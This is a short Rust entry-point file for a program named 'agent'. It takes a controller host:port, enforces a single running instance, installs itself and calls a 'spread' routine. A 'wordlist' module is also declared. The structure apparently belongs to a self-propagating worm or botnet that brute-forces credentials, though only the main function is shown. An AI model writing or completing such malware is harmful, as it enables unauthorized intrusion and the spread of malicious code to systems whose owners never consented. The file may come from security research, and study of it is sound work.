use single_instance::SingleInstance;
use std::env;

mod config;
mod error;
mod install;
mod spread;
mod wordlist;

pub use error::Error;

fn usage() {
    println!("Usage:\nagent host:port\nex: 127.0.0.1:1322");
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut args = env::args();
    if args.len() != 2 {
        usage();
        return Ok(());
    }
    let host_port = args.nth(1).unwrap();

    let instance = SingleInstance::new(config::SINGLE_INSTANCE_IDENTIFIED).unwrap();
    if !instance.is_single() {
        return Ok(());
    }

    let install_dir = install::install()?;

    spread::spread(install_dir, &host_port)?;

    Ok(())
}
